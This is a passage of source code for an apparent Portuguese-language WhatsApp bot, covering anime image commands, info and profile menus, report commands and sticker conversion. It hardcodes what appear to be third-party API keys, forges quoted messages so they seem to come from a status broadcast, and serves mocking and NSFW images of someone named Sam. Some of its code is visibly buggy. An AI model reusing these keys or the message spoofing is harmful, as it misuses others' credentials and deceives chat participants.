data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'ino':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Ino Yamanaka"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'orochimaru':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Orochimaru"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'neji':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Neji Hyuga"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'sasori':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Sasori"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'nagatoro':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Hayase Nagatoro"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'kilua':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Killua Zaoldyeck"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'deku':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Izuku Midoriya (Deku)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'allmight':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Toshinori Yagi (All Might)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'katsuki':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Katsuki Bakugo (Kacchan)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'tenya':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Ten'ya Iida (Ingenium)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'ochaco':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Ochaco Uraraka (Uravity)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'minoru':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Minoru Mineta"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'ashido':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Mina Ashido (Alien Queen/Pinky)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'shoto':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Shoto Todoroki (Shoto)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'tsuyu':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Tsuyu Asui (Froppy/Tsu)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'denki':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Denki Kaminari (Chargebolt)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'eijiro':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Eijiro Kirishima (Red Riot)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'fumikage':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Fumikage Tokoyami (Tsukuyomi)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'yaoyorozu':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Momo Yaoyorozu (Everything Hero: Creati)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'itsuka':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Itsuka Kendo (Battle Fist)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'neito':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Neito Monoma (Phantom Thief)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'mei':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Mei Hatsume (Mei)"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

case 'neko2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["neko"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break*/

/* ===================================================[ ${NomeDoMenu} ]==============================================================*/    



/*===================================================[ ${NomeDoMenu} ]==============================================================*/    
case 'infor':
case 'info':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const chatts4 = `${totalchat.length}`
const info1 = fs.readFileSync('./src/info.mp4')
loli.sendMessage(from, info1,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ ɪɴғᴏʀᴍᴀᴄ̧ᴏ̃ᴇs ᴅᴏ ʙᴏᴛ
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts4} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼ᴇ𝚗𝚞 𝚍𝚎 𝚒𝚗𝚏𝚘𝚛𝚖𝚊𝚌̧𝚘̃𝚎𝚜
┃⋆│💎➢ ${prefix}Owner ⟨🌸⟩
┃⋆│➥ Numero do meu criador
┃⋆│💎➢ ${prefix}Ping ⟨💎⟩
┃⋆│➥ Teste para ver se tá on
┃⋆│💎➢ ${prefix}Perfil ⟨🧸⟩
┃⋆│➥ Mostrar suas informações
┃⋆│💎➢ ${prefix}Itsme ⟨😣⟩
┃⋆│➥ Seu perfil, com wame
┃⋆│💎➢ ${prefix}Bugreport ⟨💫⟩
┃⋆│➥ Fale sobre erros para o meu dono
┃⋆│💎➢ ${prefix}Request ⟨💖⟩
┃⋆│➥ Quer pedir algo ao dono do bot?
┃⋆│💎➢ ${prefix}Info-bot ⟨👾⟩
┃⋆│➥ Informações do bot
┃⋆│💎➢ ${prefix}Bloqueados ⟨🌀⟩
┃⋆│➥ Lista de usuários bloqueados
┃⋆╰───────────────────
╰━════════════════════⊷`})
break

case 'ping':
      case 'speed':
              timestampe = speed();
              latensie = speed() - timestampe
              reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nResponder em ${latensie.toFixed(4)} Sec 💬`)
              break

case 'infome': //info
case 'perfil':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const p12 = await loli.getStatus(sender)
const usLevel = getLevelingLevel(sender)
const usXp = getLevelingXp(sender)
const usTime = getRegisterTime(sender) 

const serh = getRegisterSerial(sender)
const dindin1 = checkATMuser(sender)
const regin = getRegisterName(sender)
const requirXp = 20 * Math.pow(usLevel, 2) + 150 * usLevel + 1000
try {
ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
Prema1 = isvipp ? '𝙑𝙄𝙋💎👑' : '𝙉𝘼𝙊 𝙑𝙄𝙋🚫'
const pf = 
`
  ‣ Nome: @${sender.split("@")[0]}
  ‣ Registrado: ✅
  ‣ Tipo de usuário: ${prema}
  ‣ Extra: ${Prema1}
  ‣ Nome ${pushname}
  ‣ Bio: ${p12.status}
  ‣ Registrado desde: ${usTime}
  ‣ Level: ${usLevel}
  ‣ XP: ${usXp}/${requirXp}
  ‣ Dinheiro: ${dindin1}💸
  ‣ Patente: ${patt}
  ‣ Cash: $${(getBalance(sender, balance))}💰
  ‣ Ouro : ${getEmas(sender)}🪙
  ‣ Ferro : ${getBesi(sender)}⛓️
  ‣ Diamante : ${getDm(sender)}💎
  ‣ Peixe : ${getFish(sender)}🎣
  ‣ link: wa.me/${sender.split("@")[0]}
  ‣ Código: ${serh}
`
its = await getBuffer (ppimg)
loli.sendMessage(from, its, image, {quoted: horiNome, thumbnail:null, caption: pf, contextInfo: {mentionedJid: [sender]}})
if(usLevel == undefined && usXp == undefined && usTime == undefined && serh == undefined && idad == undefined) {
}
if (p12.status == 401) {
reply("Bio Indisponível")
}
break

case 'owner':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.sendMessage(sender, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: mek})
loli.sendMessage(sender, 'ESTE E MEU CRIADOR [(>_<)] CASO TENHA ALGUMA DUVIDA FALE COM ELE 🐤',MessageType.text, { quoted: mek} )
loli.sendMessage(from, 'Numero do meu criador foi enviado ao seu privado',MessageType.text, { quoted: mek} )
break

case 'request': //info
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const pesann = body.slice(8)
if (args.length > 300) return loli.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: mek})
var nomor = mek.participant
const teks2 = `[REQUEST]\nDe: @${sender.split("@s.whatsapp.net")[0]}\nMensagem: ${pesann}`
var options = {
text: teks2,
contextInfo: {mentionedJid: [sender]},
}
loli.sendMessage(`${SeuNumero}@s.whatsapp.net`, options, text, {quoted: mek})
reply("Mensagem enviada ao meu dono; Spam = block + ban.")
break

case 'bugreport': //info
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const bug1 = body.slice(10)
 if (args.length > 300) return loli.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: mek})
var nomor = mek.participant
teks1 = `[REPORT]\nDe: @${sender.split("@s.whatsapp.net")[0]}\nErro ou bug: ${bug}`
var options = {
 text: teks1, 
contextInfo: {mentionedJid: [sender]}, 
}
loli.sendMessage(`${SeuNumero}@s.whatsapp.net`, options, text, {quoted: mek})
reply("Mensagem enviada ao meu dono; Spam = block + ban.")
break

case 'bloqueados': //info
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
teks = 'Esta é uma lista de números bloqueados :\n'
for (let block of blocked) {
teks += `~> @${block.split('@')[0]}\n`
}
teks += `Total : ${blocked.length}`
loli.sendMessage(from, teks.trim(), extendedText, {quoted: say1, contextInfo: {"mentionedJid": blocked}})
break

/* ===================================================[ ${NomeDoMenu} ]==============================================================*/    



/*===================================================[ ${NomeDoMenu} ]==============================================================*/    

case 'hash': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isQuotedSticker) return reply("Marque um sticker")
const encmeds9 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mediastick = await loli.downloadMediaMessage(encmeds9)
var crypto = require('crypto')
hash = crypto.createHash('sha256').update(mediastick).digest('base64');
console.log(hash)
reply(hash)
break

case 'amp': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var chifre = ["Ban automático ??🏽‍✈️", "Membro comum 🤓", "Administrador 😎"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `Você é:\n\n${gado}`
reply(hisil)
break

case"":     
if (!isAutofigu) return
if (isMedia && !mek.message.videoMessage && !mek.message.audioMessage) {
const encmedia = mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)               
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
//reply('deu error tente novamente')
})
.on('end', function () {
console.log('[\x1b[1;31mFIG\x1b[1;37m]', color('Auto figurinha'), 'Em', color(groupName))
exec(`webpmux -set exif ${addMetadata(`${SeuNome}`)} ${ran} -o ${ran}`, async (error) => {
loli.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
fs.unlinkSync(media)	
fs.unlinkSync(ran)	
 })
 })
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`, `scale='min(180,iw)':min'(180,ih)':force_original_aspect_ratio=decrease,fps=20, pad=180:180:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if (isMedia && mek.message.videoMessage.seconds < 11 && !mek.message.audioMessage) {
const encmedia = mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
})
.on('end', function () {
console.log('[\x1b[1;31mFIG\x1b[1;37m]', color('Auto figurinha'), 'Em', color(groupName))
exec(`webpmux -set exif ${addMetadata(`${SeuNome}`)} ${ran} -o ${ran}`, async (error) => {
//if (error) return reply('❌DEU ERROR TENTE NOVAMENTE OU USE O #ST')
loli.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
//.addOutputOptions(["-y", "-vcodec libwebp", "-lossless 1", "-qscale 1", "-preset default", "-loop 0", "-an", "-vsync 0", "-s 512x512"])
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`, `scale='min(180,iw)':min'(180,ih)':force_original_aspect_ratio=decrease,fps=20, pad=180:180:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)
ranw = getRandom('.webp')
ranp = getRandom('.png')
keyrmbg = 'sfFSzxRz7y6jYDwfxx47rCgz'
await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
exec(`webpmux -set exif ${addMetadata(`${SeuNome}`)} ${ranw} -o ${ranw}`, async (error) => {
loli.sendMessage(from, fs.readFileSync(ranw), sticker, {quoted: say1})
fs.unlinkSync(ranw)
})
})
})
}
break

//_COMANDOS DE FOTO
case 'sam': 
case 'sansung':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
data = fs.readFileSync('./database/arquivos/samsansung.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
loli.sendMessage(from, buffer, image, {caption: 'Fotos da sam🖕😐', quoted: say1})
break
//_FIM DOS COMANDOS DE FOTO

//_COMANDOS NSFW
case 'sam-pld': 
case 'sam18':
case 'sampld':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(ptbr.nsfw())
data = fs.readFileSync('./database/arquivos/sampld.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
loli.sendMessage(from, buffer, image, {caption: 'Admin opressor esta off kkk🧙‍♂️', quoted: say1})
break

//_FIM DOS COMANDOS NSFW
case 'wikipedia': 
case 'sobre':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
teks = body.slice(11)
send = await fetchJson(`https://api-exteam.herokuapp.com/api/info/wikipedia?search=${teks}&apikey=pip`)
teks = ` ${send.result.result}`
loli.sendMessage(from, teks, text, {quoted: say1})
break
// pinterest indefinido
case 'indefinido765': 
//@Kratos 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://api-exteam.herokuapp.com/api/pinterest?apikey=tobi12&search=chaves`)		
reply(ptbr.wait())		
n = JSON.parse(JSON.stringify(data));
nimek =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok , image, {quoted: say1, caption: "Achei isso Oni chan 👉??👈🏼" , quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${cr}`, 'jpegThumbnail': fs.readFileSync('./help/botlogo.webp')}}}})
break    	   			 

//--TESTE TRAVAS
case 'truth': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const ttrth = trut[Math.floor(Math.random() * trut.length)]
loli.sendMessage(from, `DESTRAVAS\n${ttrth}`, text, {
quoted: say1
})
break

case 'swm': 
case 'stickerwm':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
// ESSA CONST É UM VERIFICADO \\
//const fgif = {key: { fromMe: false, participant: '0@s.whatsapp.net', ...(from ? { remoteJid: "6283815956151-1613049930@g.us" } : {}) }, message: { videoMessage: { title: "Feito", seconds: 999, gifPlayback: true, caption: `📄${NomeDoBot}\n??${NomeDoAtualDono}`, jpegThumbnail: fs.readFileSync('me.jpg')} } }

if (type === 'imageMessage' || isQuotedImage){
var pack = `𝗛𝗼𝗿𝗶-𝗕𝗢𝗧`
var author = `${pushname}`
reply(mess.wait)
const getbuff = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const dlfile = await loli.downloadMediaMessage(getbuff)
const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
var mantap = await convertSticker(bas64, `${author}`, `${pack}`)
var imageBuffer = new Buffer.from(mantap, 'base64');
loli.sendMessage(from, imageBuffer, MessageType.sticker, {quoted: say1})
} else {
reply('Formato incorreto marque uma imagem!\n exemplo: nome | nome ')
}
break

case 'figu2':
if (isMedia && !loli.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = `𝗛𝗼𝗿𝗶-𝗕𝗢𝗧`
const author1 = `${pushname}`
exif.create(packname1, author1, `stickwm_${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.stick)
loli.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: say1})
fs.unlinkSync(media)	
fs.unlinkSync(`./sticker/${sender}.webp`)	
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isMedia && loli.message.videoMessage.fileLength < 10000000 || isQuotedVideo && loli.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = `𝗛𝗼𝗿𝗶-𝗕𝗢𝗧`
const author1 = `${pushname}`
exif.create(packname1, author1, `stickwm_${sender}`)
reply(mess.wait)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.stick)
loli.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: say1})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
reply(`Envie uma imagem / vídeo com a legenda $ {prefix} nome do stickerwm | autor ou imagem / vídeo marcado que foi enviado \ nNota: a duração máxima do vídeo é de 10 segundos`)
}
break

case 'vid':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
reply(ptbr.wait())
